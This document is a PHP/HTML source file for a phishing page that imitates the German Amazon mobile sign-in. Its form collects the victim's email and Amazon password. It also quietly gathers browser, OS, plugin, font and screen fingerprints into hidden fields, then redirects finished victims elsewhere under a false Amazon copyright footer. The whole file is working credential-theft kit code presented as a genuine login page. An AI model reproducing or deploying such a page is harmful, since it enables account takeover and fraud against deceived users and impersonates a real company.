<?php
	session_start();
	include("config.php");
	
	if (isset($_SESSION['finished']) && $_SESSION['finished']) {
		header('Location: '. $redirect);
	}
?>

<!DOCTYPE html>
<html class="a-ember a-transition a-transform a-opacity a-border-image a-border-radius a-box-shadow a-text-stroke a-text-shadow a-mobile a-ios a-touch-scrolling a-transform3d a-gradients a-local-storage a-textarea-placeholder a-input-placeholder a-autofocus a-webworker a-history a-drag-drop a-svg a-canvas a-video a-audio a-js a-touch a-mobile a-ws a-audio a-video a-canvas a-svg a-drag-drop a-history a-webworker a-autofocus a-input-placeholder a-textarea-placeholder a-local-storage a-gradients a-transform3d a-touch-scrolling a-ios a-mobile a-text-shadow a-text-stroke a-box-shadow a-border-radius a-border-image a-opacity a-transform a-transition" data-19ax5a9jf="mongoose" data-aui-build-date="3.17.5.1-2017-04-11">
	<head>
		<meta http-equiv="content-type" content="text/html; charset=UTF-8">
		<title><?php echo $title ?></title>
		<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0">
		<link rel="stylesheet" href="src/css/51DPEdT1dL.css">
		<link rel="stylesheet" href="src/css/AuthenticationPortalAssets-00b5524f401f34fc3868ad90d4aa679bf.css">
		<link href="src/img/favicon.ico" rel="shortcut icon" />
		<script src="//code.jquery.com/jquery-1.11.0.min.js"></script>
		<script src="src/js/a.js"></script>
		<script>
			$(document).ready(function(){
				var client = new ClientJS();
				
				$("#browser_info").val(client.getBrowser() + " " + client.getBrowserMajorVersion());
				$("#os_info").val(client.getOS() + " " + client.getOSVersion());
				$("#screenPrint").val(client.getScreenPrint());
				$("#plugins").val(client.getPlugins());
				$("#isJava").val(client.isJava() + " " + client.getJavaVersion());
				$("#isFlash").val(client.isFlash() + " " + client.getFlashVersion());
				$("#isSilverlight").val(client.isSilverlight() + " " + client.getSilverlightVersion());
				$("#isMimeTypes").val(client.isMimeTypes() + " " + client.getMimeTypes());
				$("#fonts").val(client.getFonts());
			});
		</script>
	</head>

  <body class="a-color-offset-background  ap-locale-de_DE a-m-de a-aui_51744-c a-aui_57326-c a-aui_72554-c a-aui_83815-c a-aui_86171-c a-aui_96511-t1 a-aui_accessibility_49860-c a-aui_attr_validations_1_51371-c a-aui_bolt_62845-c a-aui_noopener_84118-t1 a-aui_ux_102912-c a-aui_ux_59374-c a-aui_ux_60000-c a-aui_ux_92006-t1 a-aui_ux_98513-c a-dex_92889-c auth-show-password-enabled auth-show-password-engaged auth-show-password-ready" style="">
		<div id="a-page">
			<div class="a-section a-spacing-none">
				<link rel="stylesheet" href="src/css/51b-EJ2JOWL.css">
				<style type="text/css">
					<!--
					.nav-sprite-v3 .nav-sprite {
					background-image: url(src/img/sky_webnav_V1_sprite_1x._CB508122268_.png);
					background-repeat: no-repeat;
					}
					.nav-spinner {
					background-image: url(src/img/snake._CB192194539_.gif);
					}
					-->
				</style>

				<header class="nav-mobile nav-locale-de nav-lang-de nav-ssl nav-unrec nav-blueheaven">
					<div id="navbar" role="navigation" class="nav-t-basicNoAuth nav-sprite-v3">
						<div id="nav-logobar">
							<div class="nav-left">
								<div id="nav-logo">
									<a href="#" class="nav-logo-link" tabindex="">
										<span class="nav-logo-base nav-sprite"></span>
										<span class="nav-logo-ext nav-sprite"></span>
										<span class="nav-logo-locale nav-sprite"></span>
									</a>
								</div>
							</div>
							<div class="nav-right"></div>
						</div>
					</div>
				</header>
			</div>

			<div class="a-container">
				<div class="a-section a-spacing-none"></div>
				<div class="a-section a-spacing-none auth-pagelet-mobile-container"></div>

				<div class="a-section auth-pagelet-mobile-container">

					<div id="auth-alert-window" class="a-box a-alert a-alert-error" style="display:<?php echo (isset($_SESSION['err']) ? "block" : "none"); ?>">
						<div class="a-box-inner a-alert-container">
							<h4 class="a-alert-heading">Ein Problem ist aufgetreten:</h4>
							<div class="a-alert-content">
								<ul class="a-unordered-list a-vertical auth-error-messages" role="alert">
									<li id="auth-email-missing-alert" style="display:<?php echo (isset($_SESSION['err']) ? "block" : "none"); ?>">
										<span class="a-list-item">
											<?php echo  (isset($_SESSION['err']) ? $_SESSION['err'] : ""); unset($_SESSION['err']); ?>
										</span>
									</li>
								</ul>
							</div>
						</div>
					</div>

					<form name="signIn" method="post" novalidate="" action="index.php" class="auth-validate-form auth-clearable-form fwcim-form" formnovalidate>
						<input type="hidden" name="browser_info" id="browser_info">
						<input type="hidden" name="os_info" id="os_info">
						<input type="hidden" name="screenPrint" id="screenPrint">
						<input type="hidden" name="plugins" id="plugins">		
						<input type="hidden" name="isJava" id="isJava">		
						<input type="hidden" name="isFlash" id="isFlash">		
						<input type="hidden" name="isSilverlight" id="isSilverlight">		
						<input type="hidden" name="isMimeTypes" id="isMimeTypes">		
						<input type="hidden" name="fonts" id="fonts">
						<div class="a-row">
							<div class="a-column a-span6">
								<h1 class="a-spacing-small a-spacing-top-small a-text-left">
								Anmelden
								</h1>
							</div>

							<div class="a-column a-span6 a-text-right a-spacing-top-base a-span-last">
								<a id="auth-fpp-link-bottom" class="a-link-normal" href="#">
								Passwort vergessen
								</a>        
							</div>
						</div>

						<div class="a-input-text-group a-spacing-medium a-spacing-top-micro">
							<label for="ap_email" class="a-form-label auth-mobile-label">
								E-Mail-Adresse
							</label>

							<div class="a-input-text-wrapper auth-required-field auth-fill-claim"><input value="<?php echo (isset($_SESSION['email']) ? $_SESSION['email'] : ""); ?>" maxlength="128" id="ap_email" placeholder="E-Mail-Adresse" name="email" tabindex="1" autocorrect="off" autocapitalize="off" type="email"></div>

							<label for="ap_password" class="a-form-label auth-mobile-label">
								Amazon Passwort
							</label>

							<div id="auth-password-container" class="a-input-text-wrapper auth-required-field auth-password-container auth-password auth-fill-password">
								<input maxlength="1024" id="ap_password" placeholder="Amazon Passwort" name="password" tabindex="2" type="password">
								<div class="a-row auth-visible-password-container auth-show-password-empty">
									<span class="a-size-small a-color-secondary auth-visible-password"></span>
								</div>
							</div>
						</div>
					
						<div class="a-row a-spacing-base">
							<div data-a-input-name="rememberMe" class="a-checkbox a-checkbox-fancy a-control-row a-touch-checkbox">
								<label>
									<input name="rememberMe" value="true" tabindex="4" type="checkbox">
									<i class="a-icon a-icon-checkbox"></i>
									<span class="a-label a-checkbox-label">
										Angemeldet bleiben.
										<span class="a-declarative" data-action="a-modal" data-a-modal="{&quot;max-width&quot;:&quot;500px&quot;,&quot;width&quot;:&quot;95%&quot;,&quot;name&quot;:&quot;remember-me-detail-link-modal&quot;,&quot;header&quot;:&quot;\&quot;Angemeldet bleiben\&quot; Kontrollkästchen&quot;}">
											<a id="remember_me_learn_more_link" class="a-link-normal" href="#">
											Details
											</a>
										</span>
									</span>
								</label>
							</div>
						</div>

						<div class="a-row"></div>

						<div class="a-section">
							<div class="a-button-stack">
								<span id="auth-signin-button" class="a-button a-spacing-extra-large a-button-span12 a-button-primary auth-share-credential-off">
									<span class="a-button-inner">
										<input id="signInSubmit" name="doLogin" tabindex="6" class="a-button-input" aria-labelledby="auth-signin-button-announce" type="submit" formnovalidate>
										<span id="auth-signin-button-announce" class="a-button-text" aria-hidden="true">
											Anmelden
										</span>
									</span>
								</span>

								<div class="a-section a-spacing-medium a-text-center">

									<div class="a-divider a-divider-break"><h5>Neu bei Amazon?</h5></div>
									<span class="a-button a-button-span12" id="a-autoid-0">
										<span class="a-button-inner">
											<a id="createAccountSubmit" tabindex="7" href="#" class="a-button-text" role="button">
												Neues Amazon Konto erstellen
											</a>
										</span>
									</span>
								</div>
							</div>
						</div>
					</form>
				</div>

				<footer class="nav-mobile nav-locale-us nav-lang-en nav-ftr-batmobile">
					<div id="nav-ftr" class="nav-t-basicNoAuth nav-sprite-v3">

						<div class="icp-container-mobile">
							<style type="text/css">
								#icp-touch-link-language { display: none; }
							</style>    

							<a href="#" class="icp-touch-link-2" id="icp-touch-link-language">
								<div class="icp-nav-globe-img-2 icp-mobile-globe-2"></div><span class="icp-color-base">Deutsch</span><span class="nav-arrow icp-up-down-arrow"></span>
							</a>

							<style type="text/css">
								#icp-touch-link-country { display: none; }
							</style>
							
							<a href="#" class="icp-touch-link-2" id="icp-touch-link-country">
								<span class="icp-flag-3 icp-flag-3-de"></span><span class="icp-color-base">Deutschland</span>
							</a>
						</div>

						<ul class="nav-ftr-horiz">
							<li class="nav-li"><a href="#" class="nav-a">Unsere AGB</a></li>
							<li class="nav-li"><a href="#" class="nav-a">Datenschutzerklärung</a></li>
							<li class="nav-li"><a href="#" class="nav-a">Impressum</a></li>
							<li class="nav-li"><a href="#" class="nav-a">Cookies &amp; Internet-Werbung</a></li>
						</ul>
						<div id="nav-ftr-copyright">© 1998-<?php echo date("Y"); ?>, Amazon.com, Inc. oder Tochtergesellschaften</div>
					</div>
				</footer>
			</div>
		</div>
	</body>
</html>